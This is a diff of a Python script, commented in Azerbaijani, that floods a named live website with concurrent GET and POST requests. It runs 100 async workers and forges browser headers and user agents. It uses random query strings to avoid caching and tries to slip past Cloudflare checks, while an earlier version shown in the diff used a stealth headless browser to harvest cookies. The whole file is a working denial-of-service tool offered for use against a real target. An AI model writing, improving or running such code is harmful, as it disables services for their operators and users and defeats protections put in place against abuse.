@@ -1,78 +1,65 @@
 import asyncio
-from playwright.async_api import async_playwright
-from playwright_stealth import stealth
 import httpx
-import time
 import random
 import string
+import time
 
 TARGET_URL = "https://streamwin.win"
-WORKERS = 40  # Railway gücü üçün 40 worker ideal dır
-BATCH_SIZE = 150 # Hər worker bir dəfəyə 150 sorğu atsın
+WORKERS = 100 # Brauzer olmadığı üçün sayı 100-ə qaldıra bilərik
+BATCH_SIZE = 50 # Hər dalğada 50 sorğu
 
-def random_str(n=10):
+def random_str(n=8):
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
 
-async def get_valid_session(p):
-    browser = await p.chromium.launch(headless=True, args=['--no-sandbox', '--disable-setuid-sandbox'])
-    context = await browser.new_context(
-        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
-    )
-    page = await context.new_page()
-    await stealth(page)
-    
-    try:
-        await page.goto(TARGET_URL, wait_until="networkidle")
-        await asyncio.sleep(8)
-        cookies = await context.cookies()
-        cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
-        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
-        await browser.close()
-        return cookie_str, ua
-    except:
-        await browser.close()
-        return None, None
+# Real brauzer başlıqları
+UA_LIST = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edge/124.0.0.0"
+]
 
 async def attack_worker(worker_id):
-    async with async_playwright() as p:
+    # Cloudflare HTTP/2 yoxlamasını keçmək üçün modern bir client
+    async with httpx.AsyncClient(http2=True, verify=False, timeout=10.0) as client:
+        print(f"🚀 Worker {worker_id} aktivdir...")
         while True:
-            cookie, ua = await get_valid_session(p)
-            if not cookie: continue
-            
-            print(f"🚀 Worker {worker_id} -> BEYPASS UĞURLU! HÜCUM ŞİDDƏTLƏNİR...")
-            
-            async with httpx.AsyncClient(http2=True, verify=False) as client:
-                for _ in range(500): # 500 dalğa göndər, sonra yenidən bypass et
-                    try:
-                        tasks = []
-                        for _ in range(BATCH_SIZE):
-                            # Həm GET, həm POST (Serveri yormaq üçün)
-                            method = random.choice(["GET", "POST"])
-                            url = f"{TARGET_URL}/?{random_str()}={random_str()}"
-                            headers = {
-                                "User-Agent": ua,
-                                "Cookie": cookie,
-                                "Referer": "https://www.google.com/",
-                                "X-Requested-With": "XMLHttpRequest"
-                            }
-                            
-                            if method == "GET":
-                                tasks.append(client.get(url, headers=headers, timeout=5.0))
-                            else:
-                                tasks.append(client.post(url, headers=headers, data={random_str(): random_str()}, timeout=5.0))
-                        
-                        await asyncio.gather(*tasks, return_exceptions=True)
-                    except:
-                        break # Bağlantı kəsilsə kuki yenilə
+            try:
+                tasks = []
+                for _ in range(BATCH_SIZE):
+                    headers = {
+                        "User-Agent": random.choice(UA_LIST),
+                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+                        "Accept-Language": "en-US,en;q=0.9",
+                        "Accept-Encoding": "gzip, deflate, br",
+                        "Connection": "keep-alive",
+                        "Sec-Fetch-Dest": "document",
+                        "Sec-Fetch-Mode": "navigate",
+                        "Sec-Fetch-Site": "none",
+                        "Cache-Control": "max-age=0"
+                    }
+                    
+                    # Dinamik URL (Cloudflare Keşi üçün)
+                    url = f"{TARGET_URL}/?{random_str()}={random_str()}"
+                    
+                    # Random olaraq GET və ya POST (Backend-i yormaq üçün)
+                    if random.random() > 0.8:
+                        tasks.append(client.post(url, headers=headers, data={random_str(): random_str()}))
+                    else:
+                        tasks.append(client.get(url, headers=headers))
+                
+                # Bütün sorğuları eyni anda göndər
+                await asyncio.gather(*tasks, return_exceptions=True)
+                
+            except Exception:
+                await asyncio.sleep(1) # IP bloklansa bir az gözlə
 
 async def main():
-    print("🔥 EXTREME RAILWAY FLOOD INITIALIZED - MAXIMUM POWER")
-    # Workerləri hissə-hissə başlat (Railway CPU-sunu dondurmasın)
-    for i in range(WORKERS):
-        asyncio.create_task(attack_worker(i))
-        await asyncio.sleep(0.5)
+    print(f"🔥 RAILWAY TURBO FLOOD INITIALIZED")
+    print(f"[*] Target: {TARGET_URL}")
     
-    while True: await asyncio.sleep(1)
+    # Bütün workerləri birdən başladırıq
+    workers = [attack_worker(i) for i in range(WORKERS)]
+    await asyncio.gather(*workers)
 
 if __name__ == "__main__":
     asyncio.run(main())
